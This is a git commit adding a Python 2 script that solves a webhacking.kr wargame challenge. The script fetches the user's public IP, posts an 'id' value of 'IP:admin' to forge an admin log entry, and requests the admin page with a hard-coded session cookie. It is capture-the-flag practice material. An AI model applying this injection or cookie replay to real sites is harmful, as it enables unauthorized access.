513176e305f2fc945cedb3d5919633d415af7e98
bindon <bindon@Creator-PC>
2018-07-30 00:26:16 +0900

    Clear Challenge38

---
+++ Challenge38.py
@@ -0,0 +1,54 @@
+#-*- coding: utf-8 -*-
+import urllib2
+import CookieManager
+import urllib
+httpConnection = None
+
+ipAddress = ""
+httpConnection = None
+print "[+] Find IP Address"
+try:
+    httpRequest = urllib2.Request("https://api.ipify.org")
+    httpConnection = urllib2.urlopen(httpRequest)
+    ipAddress = httpConnection.read()
+    print "[*] Your IP Address is [", ipAddress, "]"
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
+
+challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-9/index.php"
+parameter = urllib.urlencode({
+    "id": ipAddress+":admin"
+})
+CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
+httpRequest = urllib2.Request(challengeUrl, parameter)
+httpRequest.add_header("Cookie", CookieManager.getCookie())
+httpRequest.get_method = lambda: "POST"
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
+
+challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-9/admin.php"
+CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
+httpRequest = urllib2.Request(challengeUrl)
+httpRequest.add_header("Cookie", CookieManager.getCookie())
+httpRequest.get_method = lambda: "POST"
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
